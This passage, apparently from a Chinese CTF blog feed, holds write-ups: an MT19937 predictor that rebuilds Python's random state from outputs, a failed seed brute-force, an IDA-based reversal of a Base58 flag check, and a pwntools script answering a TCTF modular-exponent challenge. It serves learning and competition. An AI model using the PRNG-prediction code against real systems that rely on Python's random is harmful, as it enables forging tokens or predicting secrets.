<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># compatibility</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_to_bytes</span>(<span class="params">n, length, byteorder</span>):</span></span><br><span class="line">        <span class="keyword">assert</span> byteorder == <span class="string">&#x27;little&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&#x27;%x&#x27;</span> % n).zfill(length * <span class="number">2</span>).decode(<span class="string">&#x27;hex&#x27;</span>)[: : -<span class="number">1</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_from_bytes</span>(<span class="params">s, byteorder</span>):</span></span><br><span class="line">        <span class="keyword">assert</span> byteorder == <span class="string">&#x27;little&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">str</span>(s[: : -<span class="number">1</span>]).encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    _to_bytes = <span class="keyword">lambda</span> n, *args, **kwargs: n.to_bytes(*args, **kwargs)</span><br><span class="line">    _from_bytes = <span class="keyword">lambda</span> *args, **kwargs: <span class="built_in">int</span>.from_bytes(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">N = <span class="number">624</span>  <span class="comment">#: 624 values (of 32bit) is just enough to reconstruct the internal state</span></span><br><span class="line">M = <span class="number">397</span>  <span class="comment">#:</span></span><br><span class="line">MATRIX_A   = <span class="number">0x9908b0df</span>  <span class="comment">#:</span></span><br><span class="line">UPPER_MASK = <span class="number">0x80000000</span>  <span class="comment">#:</span></span><br><span class="line">LOWER_MASK = <span class="number">0x7fffffff</span>  <span class="comment">#:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tempering</span>(<span class="params">y</span>):</span></span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    y ^= (y &lt;&lt;  <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">untempering</span>(<span class="params">y</span>):</span></span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    y ^= ((y &lt;&lt;  <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>) ^ ((y &lt;&lt; <span class="number">14</span>) &amp; <span class="number">0x94284000</span>) ^ ((y &lt;&lt; <span class="number">21</span>) &amp; <span class="number">0x14200000</span>) ^ ((y &lt;&lt; <span class="number">28</span>) &amp; <span class="number">0x10000000</span>)</span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">11</span>) ^ (y &gt;&gt; <span class="number">22</span>)</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">mt, kk</span>):</span></span><br><span class="line">    mag01 = [<span class="number">0x0</span>, MATRIX_A]</span><br><span class="line">    y = (mt[kk] &amp; UPPER_MASK) | (mt[(kk + <span class="number">1</span>) % N] &amp; LOWER_MASK)</span><br><span class="line">    mt[kk] = mt[(kk + M) % N] ^ (y &gt;&gt; <span class="number">1</span>) ^ mag01[y &amp; <span class="number">0x1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genrand_int32</span>(<span class="params">mt, mti</span>):</span></span><br><span class="line">    generate(mt, mti)</span><br><span class="line">    y = mt[mti]</span><br><span class="line">    mti = (mti + <span class="number">1</span>) % N</span><br><span class="line">    <span class="keyword">return</span> tempering(y), mti</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MT19937Predictor</span>(<span class="params">random.Random</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Usage:</span></span><br><span class="line"><span class="string">    .. doctest::</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; import random</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; from mt19937predictor import MT19937Predictor</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; predictor = MT19937Predictor()</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; for _ in range(624):</span></span><br><span class="line"><span class="string">        ...     x = random.getrandbits(32)</span></span><br><span class="line"><span class="string">        ...     predictor.setrandbits(x, 32)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; random.getrandbits(32) == predictor.getrandbits(32)</span></span><br><span class="line"><span class="string">        True</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; random.random() == predictor.random()</span></span><br><span class="line"><span class="string">        True</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; a = list(range(100))</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; b = list(range(100))</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; random.shuffle(a)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; predictor.shuffle(b)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; a == b</span></span><br><span class="line"><span class="string">        True</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._mt = [ <span class="number">0</span> ] * N</span><br><span class="line">        self._mti = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setrand_int32</span>(<span class="params">self, y</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;Feceive the target PRNG&#x27;s outputs and reconstruct the inner state.</span></span><br><span class="line"><span class="string">        when 624 consecutive DOWRDs is given, the inner state is uniquely determined.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="number">0</span> &lt;= y &lt; <span class="number">2</span> ** <span class="number">32</span></span><br><span class="line">        self._mt[self._mti] = untempering(y)</span><br><span class="line">        self._mti = (self._mti + <span class="number">1</span>) % N</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">genrand_int32</span>(<span class="params">self</span>):</span></span><br><span class="line">        y, self._mti = genrand_int32(self._mt, self._mti)</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setrandbits</span>(<span class="params">self, y, bits</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;The interface for :py:meth:`random.Random.getrandbits` in Python&#x27;s Standard Library</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (bits % <span class="number">32</span> == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;number of bits must be a multiple of 32&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= y &lt; <span class="number">2</span> ** bits):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;invalid state&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> bits == <span class="number">32</span>:</span><br><span class="line">            self.setrand_int32(y)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">while</span> bits &gt; <span class="number">0</span>:</span><br><span class="line">                self.setrand_int32(y &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">                y &gt;&gt;= <span class="number">32</span></span><br><span class="line">                bits -= <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getrandbits</span>(<span class="params">self, bits</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;The interface for :py:meth:`random.Random.getrandbits` in Python&#x27;s Standard Library</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (bits &gt; <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;number of bits must be greater than zero&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> bits &lt;= <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">return</span> self.genrand_int32() &gt;&gt; (<span class="number">32</span> - bits)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            acc = <span class="built_in">bytearray</span>()</span><br><span class="line">            <span class="keyword">while</span> bits &gt; <span class="number">0</span>:</span><br><span class="line">                r = self.genrand_int32()</span><br><span class="line">                <span class="keyword">if</span> bits &lt; <span class="number">32</span>:</span><br><span class="line">                    r &gt;&gt;= <span class="number">32</span> - bits</span><br><span class="line">                acc += _to_bytes(r, <span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">                bits -= <span class="number">32</span></span><br><span class="line">            <span class="keyword">return</span> _from_bytes(acc, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">random</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;The interface for :py:meth:`random.Random.random` in Python&#x27;s Standard Library</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        a = self.genrand_int32() &gt;&gt; <span class="number">5</span></span><br><span class="line">        b = self.genrand_int32() &gt;&gt; <span class="number">6</span></span><br><span class="line">        <span class="keyword">return</span> ((a * <span class="number">67108864.0</span> + b) * (<span class="number">1.0</span> / <span class="number">9007199254740992.0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">seed</span>(<span class="params">self, *args</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Raises:</span></span><br><span class="line"><span class="string">            :py:exc:`NotImplementedError`</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setstate</span>(<span class="params">self, *args</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Raises:</span></span><br><span class="line"><span class="string">            :py:exc:`NotImplementedError`</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getstate</span>(<span class="params">self, *args</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Raises:</span></span><br><span class="line"><span class="string">            :py:exc:`NotImplementedError`</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gauss</span>(<span class="params">self, *args</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Raises:</span></span><br><span class="line"><span class="string">            :py:exc:`NotImplementedError`</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br></pre></td></tr></table></figure>

<p>这里很神奇，它并不需要状态数满624，正如代码里说的，只要bit数是32的倍数就行</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-1698433b.png" alt="20210626GKCTF-1698433b.png"></p>
<p>可能是某些性质吧，没有深入研究了，近日尽快搞定这类的题型，因为不涉及数论，所以还是要够一够，逼一逼，毕竟这么多人都做出来了</p>
<h4 id="失败的思路"><a href="#失败的思路" class="headerlink" title="失败的思路"></a>失败的思路</h4><p>还有一个思路，前面提到，由于我习惯不好，总是在源文件上修改，导致把题目改不回来了，所以多次下载。在这过程中，我终于发现到这个random.txt文件最后的修改地址竟然是2021年6月16日14点14分</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-0436bb67.png" alt="20210626GKCTF-0436bb67.png"></p>
<p>好！</p>
<p>拿别人脚本跑出来的哪有自己写的香（chòu）</p>
<p>于是我尝试枚举时间种子，因为按理说，其他语言使用随机数是要设置种子seed的，python偷懒帮你用系统时间设置了；所以只要知道当时的系统时间，就能将这一连串的随机数揪毛线一样揪出来</p>
<p>就和2021年春秋杯网络安全联赛春季赛Crypto方向中的题目time一样，虽然是签到题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-de52a22c.png" alt="20210626GKCTF-de52a22c.png"></p>
<p>所以我尝试枚举，最大的一个问题就在于虽然seed的参数可以是浮点数，但是改变其中一位产生的随机数都是大不相同的，若是按照如下的步骤，需要爆破秒数以及7位小数位，差不多千万级别，分段爆破应该也是可以爆出来的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(time.time())</span></span><br><span class="line">random.seed(time.time())</span><br><span class="line">t = random.getrandbits(<span class="number">32</span>)</span><br></pre></td></tr></table></figure>

<p>但问题在于，python的random库到底是怎么设置默认seed的格式，如果不是，上面的方法也是白给；暂时也还看不来库函数</p>
<p>所以这种思路，先爆破一下行不行</p>
<p>跟着思路走，更进一步，我们甚至知道了秒数</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-d5cfea9a.png" alt="20210626GKCTF-d5cfea9a.png"></p>
<p>我尝试了，我失败了，七位小数位应该都枚举出来了，虽然其实7位和6位种子是一样的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-4bc29e98.png" alt="20210626GKCTF-4bc29e98.png"></p>
<p>但是依旧没有找到那个这题最开的种子，至于原因，那情况可多了去了，比如文件的时间并不是2021-06-16 14:14:04左右的。贴个脚本祭奠一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(type(time.time()))</span></span><br><span class="line"><span class="comment"># &lt;class &#x27;float&#x27;&gt; 1625111993.8610187</span></span><br><span class="line"></span><br><span class="line">dt = <span class="string">&quot;2021-06-16 14:14:04&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换成时间数组</span></span><br><span class="line">timeArray = time.strptime(dt, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="comment"># 转换成时间戳</span></span><br><span class="line">timestamp = time.mktime(timeArray)</span><br><span class="line"></span><br><span class="line">seed(<span class="built_in">float</span>(<span class="number">1623824044.999999</span>))</span><br><span class="line"><span class="built_in">print</span>(getrandbits(<span class="number">32</span>))</span><br><span class="line">seed(<span class="built_in">float</span>(<span class="number">1623824044.9999991</span>))</span><br><span class="line"><span class="built_in">print</span>(time.time())</span><br><span class="line"><span class="built_in">print</span>(getrandbits(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">                    <span class="keyword">for</span> i6 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">                        <span class="keyword">for</span> i7 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">                            Seed = timestamp + i1*<span class="number">0.1</span> + i2*<span class="number">0.01</span> + i3*<span class="number">0.001</span> + i4*<span class="number">0.0001</span> + i5*<span class="number">0.00001</span> + i6*<span class="number">0.000001</span> + i7*<span class="number">0.0000001</span></span><br><span class="line">                            <span class="built_in">print</span>(<span class="built_in">float</span>(Seed))</span><br><span class="line">                            seed(<span class="built_in">float</span>(Seed)*<span class="number">256</span>)</span><br><span class="line">                            a = getrandbits(<span class="number">32</span>)</span><br><span class="line">                            <span class="keyword">if</span> a == <span class="number">2584323193</span>:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="built_in">float</span>(Seed))</span><br><span class="line">                                sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="QQQQT"><a href="#QQQQT" class="headerlink" title="QQQQT"></a>QQQQT</h3><p>首先基操问候</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210703093043860.png" alt="image-20210703093043860"></p>
<p>32位没有加任何保护，运行一下程序，GUI如下；回想题目才意识到这是用Qt框架编写的一个C++小程序，正好我们这届大一短学期学的就是Qt</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210703093410876.png" alt="image-20210703093410876"></p>
<p>然后放入ida里面静态分析，好多函数，可是没有看到熟悉的main函数，最多只有一个叫WinMain的函数，尝试分析；好样的，看不懂</p>
<p>然后放入OD里面分析，鼠标右键，选择Search for，点All referenced text strings，然后会看到</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210703095700497.png" alt="image-20210703095700497"></p>
<p>东西不多，一下就能看到flag的字样，然后多了一个界面，和QQQQT.exe运行起来的界面一样，我没看就差掉了，然后上面这个文字搜索的东西没有了，再进去就变成</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210703100557729.png" alt="image-20210703100557729"></p>
<p>呜呜呜，找不到了</p>
<p>然后重新来一遍又是上面的那个界面，暂时不知道为什么；记录下push后面的地址，直接追踪过去</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704133825642.png" alt="image-20210704133825642"></p>
<p>回到IDA找到这个地址所在位置</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704134707659.png" alt="image-20210704134707659"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704134828743.png" alt="image-20210704134828743"></p>
<p>终于找到关键函数，跳转过去shift+F12反编译一下，得到下面伪代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __thiscall <span class="title">sub_4012F0</span><span class="params">(_DWORD *<span class="keyword">this</span>)</span></span>&#123;  <span class="keyword">int</span> v1; <span class="comment">// edi  _BYTE *v2; // esi  const char *v3; // edx  _BYTE *v4; // esi  int v5; // ecx  int v6; // eax  int v7; // ecx  int v8; // edx  int v9; // edi  int v10; // esi  _BYTE *v11; // ecx  unsigned int v12; // ecx  int v14; // [esp-8h] [ebp-A8h]  char v16[4]; // [esp+10h] [ebp-90h] BYREF  char v17[4]; // [esp+14h] [ebp-8Ch] BYREF  _BYTE *v18; // [esp+18h] [ebp-88h]  const char *v19; // [esp+1Ch] [ebp-84h]  int v20; // [esp+20h] [ebp-80h]  int v21; // [esp+24h] [ebp-7Ch] BYREF  _BYTE *v22; // [esp+28h] [ebp-78h] BYREF  char v23[60]; // [esp+2Ch] [ebp-74h] BYREF  __int128 v24[2]; // [esp+68h] [ebp-38h] BYREF  __int64 v25; // [esp+88h] [ebp-18h]  int v26; // [esp+9Ch] [ebp-4h]  MEMORY[0x5FF6](*(_DWORD *)(this[6] + 4), v16);  v26 = 0;  MEMORY[0x7C7C](v16, v17);  LOBYTE(v26) = 1;  v19 = (const char *)MEMORY[0x7C48](v17);  v24[0] = 0i64;  v24[1] = 0i64;  v25 = 0i64;  strcpy(v23, &quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;);  v21 = 138 * strlen(v19) / 0x64;  v14 = v21 + 1;  v1 = 0;  v22 = (_BYTE *)MEMORY[0x8114](v21 + 1);  v2 = v22;  sub_402C08(v22, 0, v14);  v3 = v19;  v20 = (int)(v19 + 1);  if ( strlen(v19) )  &#123;    v4 = &amp;v2[v21];    v18 = v4;    while ( 1 )    &#123;      v20 = ((char)*v4 &lt;&lt; 8) + v3[v1];      v5 = v20 / 58;      *v4 = v20 % 58;      if ( v5 )      &#123;        do        &#123;          v6 = (char)*--v4;          v7 = (v6 &lt;&lt; 8) + v5;          v20 = v7 / 58;          *v4 = v7 % 58;          v5 = v20;        &#125;        while ( v20 );        v4 = v18;      &#125;      if ( ++v1 &gt;= strlen(v19) )        break;      v3 = v19;    &#125;    v2 = v22;  &#125;  v8 = 0;  if ( !*v2 )  &#123;    do      ++v8;    while ( !v2[v8] );  &#125;  v9 = v21;  if ( v8 &lt;= v21 )  &#123;    v10 = v2 - (_BYTE *)v24;    do    &#123;      v11 = (char *)v24 + v8++;      *v11 = v23[(char)v11[v10]];    &#125;    while ( v8 &lt;= v9 );  &#125;  if ( !MEMORY[0x7C1A](v24, &quot;56fkoP8KhwCf3v7CEz&quot;) )  &#123;    if ( v19 )      v12 = strlen(v19);    else      v12 = -1;    v22 = (_BYTE *)MEMORY[0x7CCC](v19, v12);    LOBYTE(v26) = 2;    v21 = MEMORY[0x7CCC](&quot;flag&quot;, 4);    LOBYTE(v26) = 3;    MEMORY[0x6124](this, &amp;v21, &amp;v22, 1024, 0);    MEMORY[0x7C66](&amp;v21);    MEMORY[0x7C66](&amp;v22);  &#125;  MEMORY[0x7C30](v17);  return MEMORY[0x7C66]();&#125;</span></span><br></pre></td></tr></table></figure>

<p>很快便可以抓住要点</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704135338529.png" alt="image-20210704135338529"></p>
<p>看我之前写的博客，这妥妥的是Base58编码</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704135404671.png" alt="image-20210704135404671"></p>
<p>也没有怎么分析源码啦，就是看到这里还有一个判断</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704135638645.png" alt="image-20210704135638645"></p>
<p>然后我直接将这串进行Base58解密，然后套上flag提交，通过了，放入运行中的程序里检测也能通过</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704135754833.png" alt="image-20210704135754833"></p>
<p>害，看别人达不溜屁做的，过把瘾过把瘾</p>
<h1 id="其他战队的WP"><a href="#其他战队的WP" class="headerlink" title="其他战队的WP"></a>其他战队的WP</h1><p>找到的别的战队师傅的WP，收集一下</p>
<p><a href="https://www.cnblogs.com/x0rjchen/p/14940396.html#_caption5">https://www.cnblogs.com/x0rjchen/p/14940396.html#_caption5</a></p>
<p><a href="https://mp.weixin.qq.com/s/AHvCrFd2E6JciItLcKlHnA">https://mp.weixin.qq.com/s/AHvCrFd2E6JciItLcKlHnA</a></p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>MT19937</tag>
      </tags>
  </entry>
  <entry>
    <title>20210704 TCTFCrypto方向部分WP</title>
    <url>/posts/df43d8e4/</url>
    <content><![CDATA[<p>0ops战队举办的比赛，题目也是很有水准的，看解出来的人数就知道</p>
<p>就出了一题，唔</p>
<p>见证sage的奇妙</p>
<span id="more"></span>

<h1 id="TCTF"><a href="#TCTF" class="headerlink" title="TCTF"></a>TCTF</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>在尚师傅手把手的悉心指导下，我艰难地完成了签到，不得不说尚师傅yyds</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704145347960.png" alt="image-20210704145347960"></p>
<p>看题目提示，只有一个nc链接和提示；没有附件，我们直接连上试试</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704145514705.png" alt="image-20210704145514705"></p>
<p>返回一个代数式，要我们给出结果，稍微想一下就知道括号里2的10842207次方结果太大，虽然确实可以算出来，但是倒数第二行也说了，要在10秒之内算出来，而且超时真的会发生；硬算是万万不行的</p>
<p>先搞一组数据下来</p>
<blockquote>
<p> 2^(2^11611932) mod 10042342927731289936658394995741010342152682534073824765054222876398250110801680355777521786191146694288599302671845390876211753297708706179377223481420568337199329681700808036260275208806645397912634380102847398612053278616443604561505446777411509098232951708762153696144378866698087620743454024477909423603 = ?</p>
</blockquote>
<p>结合提示，我尝试将指数给变小，所以思路应该集中在怎么求出这个模数的欧拉函数这个问题上。对模数进行分析，发现是1023位的，用手头现有的工具都不能将其有效分解，也就是降低指数这条路多半是行不通；而且就算是求出了欧拉函数，这个数也是很大的，放到幂上去也不能将指数变小。</p>
<p>先写个脚本接收下数据，展示下国赛之后写脚本的能力</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># nc 111.186.59.11 16256</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getroot</span>(<span class="params">s</span>):</span></span><br><span class="line">    m = re.findall(<span class="string">&quot;\d+&quot;</span>, s)</span><br><span class="line">    x, n = <span class="built_in">int</span>(m[<span class="number">2</span>]), <span class="built_in">int</span>(m[<span class="number">3</span>])</span><br><span class="line">    x = <span class="number">2</span>**x</span><br><span class="line">    ans = <span class="built_in">pow</span>(<span class="number">2</span>, x, n)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    sh = remote(<span class="string">&#x27;111.186.59.11&#x27;</span>, <span class="number">16256</span>)</span><br><span class="line">    sh.recvline()</span><br><span class="line">    s = sh.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your answer: &#x27;</span>)</span><br><span class="line">    sh.sendline(getroot(s.decode()))</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>其中用到了正则表达式，从网上现学现卖来的，然后这里先暂时直接将计算的结果返回了，没有经过数学上的简化</p>
<p>之后的我查了一些资料，也问了老师，但都失败告终，其中尝试过用自己写的数域筛法分解模数，但想必这种算法，yafu和在线网站应该都包含了，搭建了分解光滑数的工具也还是不行</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704160916416.png" alt="image-20210704160916416"></p>
<p>不买关子了，最后尚师傅坐我边上轻蔑地笑了我一句，说放到sage里试试；为了sage用pwn库，我还在linux子系统里装了sgae。然后代码粘贴进去也遇到点问题，主要是缩进的问题吧，写在函数会里方便一点</p>
<p>看效果</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704161339872.png" alt="image-20210704161339872"></p>
<p>amazing！竟然出来了，原来对于一般语言计算较慢的大指数，sage可以很快出来；其实细想也是，别的语言并不是慢，而是并不支持存放如此庞大的数，而如果只是一个循环来计算八位数的幂的话，时间复杂度还是允许的。所以总之，<strong>sage暂时滴神，尚师傅永远滴神。</strong></p>
<p>在win下的sage里，验证一下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704161735313.png" alt="image-20210704161735313"></p>
<p>看来还有上限的。回过来看看flag里面似乎给了一些信息</p>
<blockquote>
<p>flag{h0w_m4ny_squar3s_can_u_d0_in_10_sec0nds?}</p>
</blockquote>
<p>十秒之内能开几次方？嗯？题目似乎还有别的转机。。</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>sage</tag>
      </tags>
  </entry>
  <entry>
    <title>20210706【胖哈勃的七月公开赛】</title>
    <url>/posts/798f5cbc/</url>
